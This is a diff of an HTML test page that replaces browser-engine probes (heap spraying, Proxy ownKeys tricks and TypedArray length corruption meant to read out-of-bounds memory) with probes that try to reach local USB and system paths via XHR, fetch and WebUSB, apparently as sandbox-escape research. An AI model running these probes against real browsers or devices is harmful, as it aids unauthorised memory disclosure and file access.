@@ -2,13 +2,13 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>TRUE OOB Test - Compact</title>
+    <title>USB Access Test</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: monospace; background: #000; color: #0f0; padding: 10px; font-size: 11px; line-height: 1.3; }
         h1 { color: #f00; font-size: 18px; margin-bottom: 10px; text-align: center; border-bottom: 2px solid #f00; padding-bottom: 5px; }
-        .section { background: #1a0000; border: 2px solid #f00; margin: 8px 0; padding: 10px; height: calc(100vh - 140px); overflow-y: auto; }
-        .btn { padding: 8px 15px; background: #f00; border: none; color: #fff; margin: 3px; cursor: pointer; font-size: 11px; font-weight: bold; }
+        .section { background: #1a0000; border: 2px solid #f00; margin: 8px 0; padding: 10px; height: calc(100vh - 100px); overflow-y: auto; }
+        .btn { padding: 10px 20px; background: #f00; border: none; color: #fff; margin: 5px; cursor: pointer; font-size: 12px; font-weight: bold; }
         .log { padding: 2px 0; font-size: 11px; }
         .success { color: #0f0; font-weight: bold; }
         .fail { color: #f00; font-weight: bold; }
@@ -18,12 +18,9 @@
     </style>
 </head>
 <body>
-    <h1>🔬 TRUE OOB TEST 🔬</h1>
+    <h1>🔌 USB ACCESS TEST 🔌</h1>
     <div style="text-align: center; margin-bottom: 8px;">
-        <button class="btn" onclick="test1()">Test 1: Phantom Props</button>
-        <button class="btn" onclick="test2()">Test 2: Array Holes</button>
-        <button class="btn" onclick="test3()">Test 3: Victim Spray</button>
-        <button class="btn" onclick="test4()">Test 4: TypedArray</button>
+        <button class="btn" onclick="testAll()">RUN ALL TESTS</button>
     </div>
     <div class="section"><div id="log"></div></div>
 
@@ -35,272 +32,184 @@ function log(msg, type) {
     document.getElementById('log').appendChild(div);
 }
 
-function hex(val) {
-    return typeof val === 'number' ? '0x' + val.toString(16) : String(val);
-}
-
-function test1() {
+function testAll() {
     document.getElementById('log').innerHTML = '';
-    log('═══ TEST 1: Phantom Properties (No Write) ═══', 'critical');
+    log('═══════════════════════════════════════', 'critical');
+    log('       USB/FILE SYSTEM ACCESS TEST       ', 'critical');
+    log('═══════════════════════════════════════', 'critical');
     log('', '');
     
-    try {
-        log('[1] Creating object with ONLY [0-49]...', 'info');
-        var target = {};
-        for (var i = 0; i < 50; i++) target[i] = 0xAAAA0000 + i;
-        log('✓ Created 50 properties, [50-199] DO NOT EXIST', 'success');
-        
-        log('[2] Creating victims...', 'info');
-        var victims = [];
-        for (var i = 0; i < 100; i++) {
-            var v = new Uint32Array(4);
-            v[0] = 0xDEAD0000 + i;
-            victims.push(v);
-        }
-        log('✓ Created 100 victims', 'success');
-        
-        log('[3] Creating phantom proxy...', 'info');
-        var proxy = new Proxy(target, {
-            ownKeys: function(t) {
-                log('  [!] Claiming [0-199] exist but NOT writing [50-199]!', 'critical');
-                var keys = [];
-                for (var i = 0; i < 200; i++) keys.push(String(i));
-                return keys;
-            },
-            has: function(t, prop) {
-                var idx = parseInt(prop);
-                return !isNaN(idx) && idx >= 0 && idx < 200;
-            }
-        });
-        log('✓ Phantom proxy created', 'success');
-        
-        log('[4] Enumerating...', 'info');
-        var count = 0;
-        for (var key in proxy) count++;
-        log('✓ Enumerated ' + count + ' properties', 'success');
-        
-        log('', '');
-        log('[5] CRITICAL: Reading phantom [50-59] that we NEVER wrote...', 'critical');
-        var found = [];
-        for (var i = 50; i < 60; i++) {
-            var val = target[i];
-            if (val !== undefined) {
-                found.push({i: i, val: val});
-                if (found.length <= 5) {
-                    if (typeof val === 'number') {
-                        log('  [!] target[' + i + '] = ' + hex(val) + ' ← NEVER WROTE THIS!', 'critical');
-                    } else {
-                        log('  [!] target[' + i + '] = ' + val.constructor.name, 'critical');
-                    }
-                }
-            }
-        }
-        
-        log('', '');
-        log('═══ RESULTS ═══', 'info');
-        log('Claimed: 200 | Actually wrote: 50 | Found data: ' + found.length, 'info');
-        
-        if (found.length > 0) {
-            log('', '');
-            log('🎉🎉🎉 TRUE OOB CONFIRMED! 🎉🎉🎉', 'critical');
-            log('We read memory we NEVER wrote!', 'critical');
-        } else {
-            log('', '');
-            log('❌ No OOB - all phantoms returned undefined', 'fail');
-        }
-    } catch(e) {
-        log('ERROR: ' + e.message, 'fail');
+    // Test 1: File API
+    log('[TEST 1] File API', 'info');
+    if (typeof File !== 'undefined') {
+        log('  ✓ File API available', 'success');
+    } else {
+        log('  ✗ File API NOT available', 'fail');
     }
-}
-
-function test2() {
-    document.getElementById('log').innerHTML = '';
-    log('═══ TEST 2: Array Holes ═══', 'critical');
-    log('', '');
     
-    try {
-        log('[1] Creating sparse array...', 'info');
-        var arr = [];
-        arr[0] = 0xBBBB0000;
-        arr[10] = 0xBBBB000A;
-        arr[20] = 0xBBBB0014;
-        log('✓ Holes at: [1-9], [11-19], [21-29], [31+]', 'success');
-        
-        log('[2] Spraying victims...', 'info');
-        var victims = [];
-        for (var i = 0; i < 500; i++) {
-            victims.push(new Uint32Array([0xCCCC0000 + i, 0xDDDD0000 + i]));
-        }
-        log('✓ Sprayed 500 victims', 'success');
-        
-        log('[3] Creating hole proxy...', 'info');
-        var proxy = new Proxy(arr, {
-            ownKeys: function(t) {
-                log('  [!] Claiming [0-100] exist', 'warn');
-                var keys = ['length'];
-                for (var i = 0; i < 100; i++) keys.push(String(i));
-                return keys;
-            }
-        });
-        log('✓ Proxy created', 'success');
-        
-        log('[4] Enumerating...', 'info');
-        for (var key in proxy) {}
-        log('✓ Done', 'success');
-        
-        log('', '');
-        log('[5] Reading holes...', 'critical');
-        var holeData = [];
-        var testIdx = [1, 2, 3, 11, 12, 21, 22, 31, 32, 40, 50];
-        for (var i = 0; i < testIdx.length; i++) {
-            var idx = testIdx[i];
-            var val = arr[idx];
-            if (val !== undefined) {
-                holeData.push({i: idx, val: val});
-                log('  [!] arr[' + idx + '] = ' + hex(val), 'critical');
-            }
-        }
-        
-        log('', '');
-        if (holeData.length > 0) {
-            log('✓✓✓ FOUND ' + holeData.length + ' DATA IN HOLES! ✓✓✓', 'critical');
-        } else {
-            log('❌ All holes = undefined', 'warn');
-        }
-    } catch(e) {
-        log('ERROR: ' + e.message, 'fail');
+    if (typeof FileReader !== 'undefined') {
+        log('  ✓ FileReader available', 'success');
+    } else {
+        log('  ✗ FileReader NOT available', 'fail');
     }
-}
-
-function test3() {
-    document.getElementById('log').innerHTML = '';
-    log('═══ TEST 3: Adjacent Victim Spray ═══', 'critical');
-    log('', '');
     
-    try {
-        log('[1] Pre-spray 500 victims...', 'info');
-        var pre = [];
-        for (var i = 0; i < 500; i++) {
-            var v = new Uint32Array(4);
-            v[0] = 0xEEEE0000 + i;
-            pre.push(v);
-        }
-        log('✓ Done', 'success');
-        
-        log('[2] Create target with 20 props...', 'info');
-        var target = {};
-        for (var i = 0; i < 20; i++) target['p' + i] = i;
-        log('✓ Done', 'success');
-        
-        log('[3] Post-spray 500 victims...', 'info');
-        var post = [];
-        for (var i = 0; i < 500; i++) {
-            var v = new Uint32Array(4);
-            v[0] = 0x33330000 + i;
-            post.push(v);
-        }
-        log('✓ Done', 'success');
-        
-        log('[4] Creating massive phantom proxy...', 'info');
-        var proxy = new Proxy(target, {
-            ownKeys: function(t) {
-                log('  [!] Claiming 1000 properties!', 'critical');
-                var keys = [];
-                for (var i = 0; i < 1000; i++) keys.push('phantom_' + i);
-                return keys;
-            }
-        });
-        log('✓ Done', 'success');
-        
-        log('[5] Enumerating...', 'info');
-        for (var key in proxy) {}
-        log('✓ Done', 'success');
-        
-        log('', '');
-        log('[6] Reading phantoms [20-40]...', 'critical');
-        var found = [];
-        for (var i = 20; i < 40; i++) {
-            var val = target['phantom_' + i];
-            if (val !== undefined) {
-                found.push(i);
-                if (found.length <= 5) {
-                    log('  [!] phantom_' + i + ' = ' + (typeof val === 'number' ? hex(val) : val.constructor.name), 'critical');
-                }
-            }
-        }
-        
-        log('', '');
-        if (found.length > 0) {
-            log('✓✓✓ FOUND ' + found.length + ' ADJACENT DATA! ✓✓✓', 'critical');
-        } else {
-            log('❌ No adjacent data', 'warn');
-        }
-    } catch(e) {
-        log('ERROR: ' + e.message, 'fail');
+    if (typeof Blob !== 'undefined') {
+        log('  ✓ Blob API available', 'success');
+    } else {
+        log('  ✗ Blob API NOT available', 'fail');
     }
-}
-
-function test4() {
-    document.getElementById('log').innerHTML = '';
-    log('═══ TEST 4: TypedArray Length Corruption ═══', 'critical');
     log('', '');
     
+    // Test 2: File Input
+    log('[TEST 2] File Input Element', 'info');
     try {
-        log('[1] Creating container...', 'info');
-        var container = {arr: new Uint32Array(0x10)};
-        container.arr[0] = 0x12345678;
-        log('✓ arr.length = ' + hex(container.arr.length), 'success');
-        
-        log('[2] Attempting length redefine...', 'info');
+        var input = document.createElement('input');
+        input.type = 'file';
+        log('  ✓ <input type="file"> created', 'success');
+        log('  ✓ Can trigger: input.click()', 'success');
+    } catch(e) {
+        log('  ✗ Error: ' + e.message, 'fail');
+    }
+    log('', '');
+    
+    // Test 3: FileSystem API
+    log('[TEST 3] FileSystem API', 'info');
+    if (typeof requestFileSystem !== 'undefined') {
+        log('  ✓ requestFileSystem available', 'critical');
+    } else {
+        log('  ✗ requestFileSystem NOT available', 'fail');
+    }
+    
+    if (typeof webkitRequestFileSystem !== 'undefined') {
+        log('  ✓ webkitRequestFileSystem available', 'critical');
+    } else {
+        log('  ✗ webkitRequestFileSystem NOT available', 'fail');
+    }
+    log('', '');
+    
+    // Test 4: Direct path access attempts
+    log('[TEST 4] Direct Path Access Attempts', 'info');
+    var paths = [
+        '/mnt/usb0/',
+        '/mnt/usb1/',
+        '/usb0/',
+        '/usb1/',
+        '/dev/usb/',
+        'file:///mnt/usb0/',
+        '/hostapp/',
+        '/system/',
+        '/data/',
+        '/user/'
+    ];
+    
+    for (var i = 0; i < paths.length; i++) {
         try {
-            Object.defineProperty(container.arr, 'length', {value: 0x10000});
-            log('✓ Redefined to: ' + hex(container.arr.length), container.arr.length > 0x10 ? 'critical' : 'warn');
+            var xhr = new XMLHttpRequest();
+            xhr.open('GET', paths[i], false);
+            xhr.send();
+            log('  [!] ' + paths[i] + ' → status: ' + xhr.status, 'critical');
         } catch(e) {
-            log('! Failed: ' + e.message, 'warn');
+            log('  ✗ ' + paths[i] + ' → ' + e.message, 'warn');
         }
-        
-        log('[3] Creating mutation proxy...', 'info');
-        var proxy = new Proxy(container, {
-            ownKeys: function(t) {
-                log('  [!] Attempting corruption...', 'warn');
-                try { t.arr.length = 0x10000; } catch(e) {}
-                try { Object.defineProperty(t.arr, 'length', {value: 0x10000}); } catch(e) {}
-                t.arr2 = new Uint32Array(0x10000);
-                t.arr2[0] = 0xDEADBEEF;
-                return Reflect.ownKeys(t);
-            }
-        });
-        log('✓ Done', 'success');
-        
-        log('[4] Triggering...', 'info');
-        for (var key in proxy) {}
-        log('✓ Done', 'success');
-        
-        log('', '');
-        log('[5] Checking state...', 'info');
-        log('arr.length = ' + hex(container.arr.length), 'info');
-        
-        if (container.arr.length > 0x10) {
-            log('', '');
-            log('✓✓✓ LENGTH CORRUPTED! ✓✓✓', 'critical');
-            log('Attempting OOB read...', 'info');
-            for (var i = 0x10; i < 0x18; i++) {
-                var val = container.arr[i];
-                if (val !== undefined && val !== 0) {
-                    log('  arr[' + hex(i) + '] = ' + hex(val), 'critical');
-                }
-            }
-        } else {
-            log('! Length unchanged', 'warn');
-        }
-        
-        if (container.arr2) {
-            log('arr2.length = ' + hex(container.arr2.length), 'success');
-            log('arr2[0] = ' + hex(container.arr2[0]), 'success');
-        }
-    } catch(e) {
-        log('ERROR: ' + e.message, 'fail');
     }
+    log('', '');
+    
+    // Test 5: WebUSB API
+    log('[TEST 5] WebUSB API', 'info');
+    if (typeof navigator.usb !== 'undefined') {
+        log('  ✓ navigator.usb available', 'critical');
+        try {
+            navigator.usb.getDevices().then(function(devices) {
+                log('  ✓ USB devices: ' + devices.length, 'critical');
+            }).catch(function(e) {
+                log('  ✗ getDevices error: ' + e.message, 'fail');
+            });
+        } catch(e) {
+            log('  ✗ Error: ' + e.message, 'fail');
+        }
+    } else {
+        log('  ✗ navigator.usb NOT available', 'fail');
+    }
+    log('', '');
+    
+    // Test 6: Storage APIs
+    log('[TEST 6] Storage APIs', 'info');
+    if (typeof navigator.storage !== 'undefined') {
+        log('  ✓ navigator.storage available', 'success');
+    } else {
+        log('  ✗ navigator.storage NOT available', 'fail');
+    }
+    
+    if (typeof navigator.getStorageUpdates !== 'undefined') {
+        log('  ✓ navigator.getStorageUpdates available', 'critical');
+    } else {
+        log('  ✗ navigator.getStorageUpdates NOT available', 'fail');
+    }
+    log('', '');
+    
+    // Test 7: Create download link (file:// protocol)
+    log('[TEST 7] File Download/Save', 'info');
+    try {
+        var blob = new Blob(['TEST DATA'], {type: 'text/plain'});
+        var url = URL.createObjectURL(blob);
+        log('  ✓ Blob URL created: ' + url.substring(0, 50) + '...', 'success');
+        
+        var a = document.createElement('a');
+        a.href = url;
+        a.download = 'test.txt';
+        log('  ✓ Download link created', 'success');
+    } catch(e) {
+        log('  ✗ Error: ' + e.message, 'fail');
+    }
+    log('', '');
+    
+    // Test 8: XMLHttpRequest to file paths
+    log('[TEST 8] XHR File Protocol Test', 'info');
+    var filePaths = [
+        'file:///mnt/usb0/test.txt',
+        'file:///usb0/test.txt',
+        'file:///data/test.txt'
+    ];
+    
+    for (var i = 0; i < filePaths.length; i++) {
+        try {
+            var xhr = new XMLHttpRequest();
+            xhr.open('GET', filePaths[i], false);
+            xhr.send();
+            log('  [!] ' + filePaths[i] + ' → ' + xhr.status, 'critical');
+        } catch(e) {
+            log('  ✗ ' + filePaths[i] + ' → ' + e.message, 'warn');
+        }
+    }
+    log('', '');
+    
+    // Test 9: Fetch API
+    log('[TEST 9] Fetch API File Access', 'info');
+    if (typeof fetch !== 'undefined') {
+        log('  ✓ fetch() available', 'success');
+        
+        fetch('file:///mnt/usb0/test.txt').then(function(r) {
+            log('  [!] Fetch succeeded! Status: ' + r.status, 'critical');
+        }).catch(function(e) {
+            log('  ✗ Fetch failed: ' + e.message, 'warn');
+        });
+    } else {
+        log('  ✗ fetch() NOT available', 'fail');
+    }
+    log('', '');
+    
+    // Test 10: IndexedDB
+    log('[TEST 10] IndexedDB', 'info');
+    if (typeof indexedDB !== 'undefined') {
+        log('  ✓ IndexedDB available', 'success');
+    } else {
+        log('  ✗ IndexedDB NOT available', 'fail');
+    }
+    log('', '');
+    
+    log('═══════════════════════════════════════', 'critical');
+    log('              TEST COMPLETE              ', 'critical');
+    log('═══════════════════════════════════════', 'critical');
 }
 </script>
 </body>
